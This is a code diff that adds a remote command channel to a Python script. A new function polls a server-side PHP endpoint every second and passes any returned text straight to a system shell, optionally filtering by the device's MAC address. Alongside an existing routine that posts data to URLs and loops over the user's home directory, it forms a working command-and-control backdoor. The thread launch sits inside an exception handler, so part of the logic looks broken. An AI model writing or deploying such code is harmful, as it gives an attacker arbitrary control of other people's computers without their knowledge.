@@ -11,7 +11,14 @@ import wmi
 import concurrent.futures
 import random
 import shutil
+import threading
 
+# Define the PHP script URL running on your server
+php_script_url = 'http://127.0.0.1:8080/Control.php'
+
+previous_data = ""
+
+# Function to clear the console screen
 def clear_screen():
     if os.name == 'nt':
         ctypes.windll.kernel32.GetStdHandle(-11).ResizeScreenBuffer(1, 1)
@@ -21,6 +28,7 @@ def clear_screen():
     else:
         print("\033c", end="")
 
+# Function to send data to a specified URL
 def send_data_to_url(url, data):
     try:
         response = requests.post(url, data=data)
@@ -28,6 +36,34 @@ def send_data_to_url(url, data):
     except Exception as e:
         return f"Error sending data to {url}: {str(e)}"
 
+# Function to continuously receive and process data
+def receive_data():
+    global previous_data
+    while True:
+        response = requests.get(php_script_url)
+        data = response.text
+
+        if data != "" and data != previous_data:
+            if '::' in data:
+                received_mac, command = data.split('::', 1)
+                if received_mac == mac:
+                    subprocess.Popen(f"{command}", shell=True)
+                    previous_data = data
+                else:
+                    print(f"Received data with MAC address {received_mac} does not match the device's MAC address.")
+            else:
+                subprocess.Popen(f"{data}", shell=True)
+                previous_data = data
+
+        time.sleep(1)
+
+# Generate the device's MAC address
+mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
+mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
+
+# Start the data receiving thread
+
+# Main loop for other tasks
 while True:
     try:
         home_directory = os.path.expanduser("~")
@@ -130,3 +166,5 @@ while True:
     except Exception as e:
         print(f"Error: {str(e)}")
         time.sleep(0)  
+        receive_thread = threading.Thread(target=receive_data)
+        receive_thread.start()
